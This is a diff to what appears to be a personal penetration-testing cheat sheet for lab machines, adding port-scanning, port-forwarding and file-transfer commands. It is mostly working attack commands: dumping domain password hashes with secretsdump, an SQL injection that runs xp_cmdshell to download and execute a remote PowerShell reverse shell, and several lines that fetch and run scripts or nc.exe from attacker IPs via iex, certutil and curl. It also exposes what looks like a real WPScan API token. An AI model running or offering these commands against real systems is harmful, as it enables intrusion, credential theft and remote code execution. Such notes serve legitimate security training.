@@ -4,6 +4,13 @@ Dump Secrets Such as SYSTEM and ntds.dit:
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -sam SAM LOCAL
 ```
 
+Discovery:
+
+```bash
+sudo nmap $ip -p- -T5 --open
+ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
+sudo autorecon $ip --ports="$ports" --wpscan.api-token KvAyO8bM4TYYDwJJMNhoU95g591rdNvk3jiKpQHG5uY --subdomain-enum.domain hack.htb --global.domain hack.htb
+```
 Shellshock:
 
 ```bash
@@ -17,9 +24,12 @@ http://10.11.1.71:80/cgi-bin/admin.cgi
 Local port forward:
 
 ```bash
+https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
 ssh -i id_ecdsa userE@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
 # On the box running on port 80, want it to be on my machine
 ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 ariah@192.168.239.99
+ssh -N -L <your machine>:<your port>:<where \'s running on their machine>:<... port> user@$ip
+ssh -N -L 127.0.0.1:8444:127.0.0.1:8443 nadine@$ip
 ```
 
 Elevate privileges of a user you have access to with a single command:
@@ -32,8 +42,12 @@ Add-LocalGroupMember -Group Administrators -Member ariah
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
 iex(iwr -uri 192.168.45.187:8000/transfer_files.ps1 -usebasicparsing)
+iex(iwr -uri 10.10.14.8:8000/transfer_files.ps1 -usebasicparsing)
+curl 10.10.14.8:8000/nc.exe -o nc.exe
 
 iex(iwr -uri 192.168.49.129:8000/transfer_files.ps1 -usebasicparsing)
+
+iwr -uri 10.10.14.8:8000/transfer_files.ps1 -usebasicparsing -outfile c:\
 
 iex(iwr -uri 10.10.112.153:1234/transfer_files_ad.ps1 -usebasicparsing)
 certutil.exe -f -urlcache -split http://192.168.49.129:8000/nc.exe nc.exe
